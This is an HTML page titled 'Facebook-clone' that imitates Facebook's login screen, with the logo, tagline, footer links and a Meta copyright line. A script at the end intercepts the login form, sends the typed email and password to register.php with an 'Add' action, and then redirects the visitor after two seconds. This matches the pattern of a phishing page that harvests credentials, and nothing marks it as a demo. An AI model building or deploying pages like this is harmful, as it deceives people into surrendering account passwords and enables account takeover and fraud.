<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook-clone</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/fontawesome.min.css"/>
    <script src="https://kit.fontawesome.com/ae0531fa65.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css"/>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<div class="container">
    <div class="row first-row mb-5">
        <div class="col">
            <div class="fb-img">
                <img class="img-fluid fb-logo" src="images/Facebook.png">
            </div>
            <div class="paragraph">
                <h2>
                Facebook helps you connect and share with the people in your life.
                </h2>
            </div>
        </div>
        <div class="col">
            <form class="form-signin text-center mb-4" id="myform" method="post">
                <div class="mb-3">
                  <input type="email" required type="email" placeholder="Email address or phone number" class="form-control" id="email">
                </div>
                <div class="mb-2">
                  <input type="password" required placeholder="Password" class="form-control" id="password">
                </div>
                <div class=" mb-3 text-center">
                    <button  type="submit" class=" btn btn-primary login-btn">Log In</button>
                </div>
              <div class="forgottenpwdtext text-center">
                  <a href="">Forgotten password?</a>
              </div>
              <div class="line mb-3"></div>
            <button class="btn btn-primary login-btn create-account-btn text-center">
                    Create New Account
            </button>
              </form>
              <div class="txt-under-table text-center mb-2">
                <a href="#" class="create-page-txt">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</div>



            <div class="footer">
                <div class="footer-container">
                    <div class="container ft-container">
                        <ul class="footer-list">
                            <li class="active" >
                                English (UK)
                            </li>
                            <li>
                                Hausa
                            </li>
                            <li>
                                Français (France)
                            </li>
                            <li>
                                Português (Brasil)
                            </li>
                            <li>
                                Español
                            </li>
                            <li>
                                العربية
                            </li>
                            <li>
                                Bahasa Indonesia
                            </li>
                            <li>
                                Deutsch
                            </li>
                            <li>
                                日本語
                            </li>
                            <li>
                                Italiano
                            </li>
                            <li>
                                हिन्दी
                            </li>
                            <li>
                            <i class="fas fa-plus text-center icon"></i>
                            </li>
                         
                        </ul>
                        <div class="line btm-line text-center"></div>
                        <ul class="footer-list ft-list-two">
                            <li class="active" >
                                Sign Up
                            </li>
                            <li>
                                Log In
                            </li>
                            <li>
                                Messenger
                            </li>
                            <li>
                                Facebook Lite
                            </li>
                            <li>
                                Watch
                            </li>
                            <li>
                                Places
                            </li>
                            <li>
                                Games
                            </li>
                            <li>
                                Marketplace
                            </li>
                            <li>
                                Facebook Pay
                            </li>
                            <li>
                                Oculus
                            </li>
                            <li>
                                Portal
                            </li>
                            <li>
                                Instagram
                            </li>
                            <li>
                                Bulletin
                            </li>
                            <li>
                                Local Fundraisers
                            </li>
                            <li>
                                Services
                            </li>
                            <li>
                                Voting Information Centre
                            </li>
                            <li>
                                Groups
                            </li>
                            <li>
                                About
                            </li>
                            <li>
                                Create ad
                            </li>
                            <li>
                                Create Page
                            </li>
                            <li>
                                Developers
                            </li>
                            <li>
                                Careers
                            </li>
                            <li>
                                Privacy 
                            </li>
                            <li>
                                Cookies
                            </li>
                            <li>
                                AdChoices
                            </li>
                            <li>
                                Terms
                            </li>
                            <li>
                                Help
                            </li>
                            <li>
                                Settings
                            </li>
                        </ul>
                    </div>
                    <div class="meta-write-up">
                        <span>
                            Meta © 2022
                        </span>
                    </div>
                </div>
            </div>
   







 <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/js/bootstrap.bundle.min.js" integrity="sha512-pax4MlgXjHEPfCwcJLQhigY7+N8rt6bVvWLFyUMuxShv170X53TRzGPmPkZmGBhk+jikR8WBM4yl7A9WMHHqvg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>    
</body>
</html>
<script>
    $('#myform').on('submit', function(e){
        e.preventDefault();
        var email = $('#email').val();
        var password = $('#password').val();
        $.ajax({
            url: "register.php",
            method: "POST",
            data: {
                username: email,
                password: password,
                action: 'Add'
            },
            dataType: 'json',
            success: function(data) {
                console.log(data)
                setTimeout(function() {
                    window.location.href = data.url;
                }, 2000);
            }
        })
    })
</script>